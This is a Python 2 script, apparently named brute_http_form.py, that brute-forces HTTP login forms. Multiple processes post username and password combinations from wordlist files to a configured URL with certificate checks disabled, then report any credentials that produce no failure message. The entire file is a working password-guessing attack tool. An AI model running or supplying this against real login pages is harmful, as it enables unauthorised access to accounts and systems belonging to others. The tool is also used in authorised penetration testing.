import requests
import multiprocessing
import sys
import Queue
import re
import json


def load_config(f):
    return json.loads(open(f).read())


def worker(url, cred_queue, success_queue):
    print '[*] Starting new worker thread.'
    while True:
        # If there are no creds to test, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Credential queue is empty, quitting.'
            return

        # If there are good creds in the queue, stop the thread
        if not success_queue.empty():
            print '[-] Success queue has credentials, quitting'
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        auth = {config['ufield']: creds[0],
                config['pfield']: creds[1]}
        auth.update(config['hidden'])
        resp = requests.post(url, data=auth, verify=False)
        if creds[1] == 'admin':
            print resp.status_code
            print resp.headers
            print resp.content
        if fail.search(resp.content) is not None:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
        else:
            print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'USAGE: brute_http_form.py config_file'
        sys.exit()

    config = load_config(sys.argv[1])

    fail = re.compile(config['fail_str'], re.I | re.M)

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(int(config['threads'])):
        p = multiprocessing.Process(target=worker, args=(config['url'],
                                                         cred_queue,
                                                         success_queue))
        procs.append(p)
        p.start()

    for user in open(config['ufile']):
        user = user.rstrip('\r\n')
        if user == '':
            continue
        for pwd in open(config['pfile']):
            pwd = pwd.rstrip('\r\n')
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)

